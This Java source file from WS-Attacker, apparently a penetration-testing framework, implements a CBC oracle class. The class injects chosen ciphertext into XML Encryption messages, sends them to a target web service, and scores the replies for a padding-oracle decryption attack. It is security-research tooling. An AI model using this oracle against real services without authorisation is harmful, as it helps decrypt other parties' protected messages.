/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Dennis Kupser
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */

package wsattacker.library.xmlencryptionattack.attackengine.oracle.concrete.cbc;

import java.util.logging.Level;
import java.util.logging.Logger;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import wsattacker.library.signatureWrapping.util.exception.InvalidPayloadException;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.AOracle;
import wsattacker.library.xmlencryptionattack.util.ServerSendCommandIF;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.request.OracleRequest;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.response.OracleResponse;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.mode.AbstractOracleBehaviour;
import wsattacker.library.xmlencryptionattack.detectionengine.detectionmanager.DetectFilterEnum;
import wsattacker.library.xmlencryptionattack.detectionengine.detectionstreams.DetectionReport;
import wsattacker.library.xmlencryptionattack.detectionengine.filter.info.AvoidedDocErrorInfo;
import wsattacker.library.xmlencryptionattack.detectionengine.filter.info.TimestampInfo;
import wsattacker.library.xmlencryptionattack.encryptedelements.ElementAttackProperties;
import wsattacker.library.xmlencryptionattack.encryptedelements.data.EncryptedDataElement;
import wsattacker.library.xmlutilities.dom.DomUtilities;

/**
 * @author Dennis
 * @version 1.0
 * @created 18-Feb-2014 10:50:04
 */
public class CBCOracle
    extends AOracle
{
    private final EncryptedDataElement m_AttackPayloadDmy;

    public CBCOracle( final DetectionReport detectRep, AbstractOracleBehaviour oracleBehave,
                      final ServerSendCommandIF serverSendCmnd )
    {
        if ( null == oracleBehave )
            throw new IllegalArgumentException( "Type of oracle not set!" );
        this.m_OracleBehaviour = oracleBehave;
        AvoidedDocErrorInfo wrapInfo =
            (AvoidedDocErrorInfo) detectRep.getDetectionInfo( DetectFilterEnum.AVOIDDOCFILTER );
        this.m_TimestampInfo = (TimestampInfo) detectRep.getDetectionInfo( DetectFilterEnum.TIMESTAMPFILTER );
        this.m_InputFile = detectRep.getRawFile();
        this.m_AvoidedFile = wrapInfo.getAvoidedDocument();
        this.m_AttackPayload = wrapInfo.getOriginalPayInput();
        this.m_ServerCommand = serverSendCmnd;
        this.m_OracleBehaviour = oracleBehave;

        Document attackDocument = DomUtilities.createNewDomFromNode( m_AvoidedFile.getDocumentElement() );
        ElementAttackProperties attackProps = m_AttackPayload.getAttackProperties();
        Element encDataPay =
            DomUtilities.findCorrespondingElement( attackDocument, attackProps.getAttackPayloadElement() );
        this.m_AttackPayloadDmy = new EncryptedDataElement( encDataPay );
    }

    @Override
    public OracleResponse[] sendRequests( OracleRequest[] request )
    {
        /*
         * OracleResponse[] oracResps = new OracleResponse[request.length]; String attackMsg = null; String respSever =
         * null; for(int i = 0;request.length>i;i++) { attackMsg = m_AttackPartBeforeCipherVal +
         * request[i].getEncryptedDataBase64() + m_AttackPartAfterCipherVal; respSever =
         * m_ServerCommand.send(attackMsg); oracResps[i].setResponse(respSever); } return oracResps;
         */
        return null;
    }

    @Override
    public void setResponseValidity( OracleResponse response, OracleResponse.Result result )
    {
        response.setResult( result );
    }

    @Override
    public OracleResponse queryOracle( OracleRequest request )
    {
        OracleResponse resp = new OracleResponse();
        String responseServer = null;
        OracleResponse respMaxScore = null;
        Document attackOwnerDoc = m_AttackPayloadDmy.getEncryptedElement().getOwnerDocument();

        m_AttackPayloadDmy.getCipherDataChild().setEncryptedData( request.getEncryptedDataBase64() );

        try
        {
            handleTimeStamp( attackOwnerDoc );
        }
        catch ( InvalidPayloadException ex )
        {
            Logger.getLogger( CBCOracle.class.getName() ).log( Level.SEVERE, null, ex );
        }

        responseServer = m_ServerCommand.send( DomUtilities.domToString( attackOwnerDoc ) );
        resp.setResponse( responseServer );
        respMaxScore = m_OracleBehaviour.compareServerRespWithUserClassification( resp, m_AttackPayloadDmy );

        numberOfQueries++;

        return respMaxScore;
    }

}
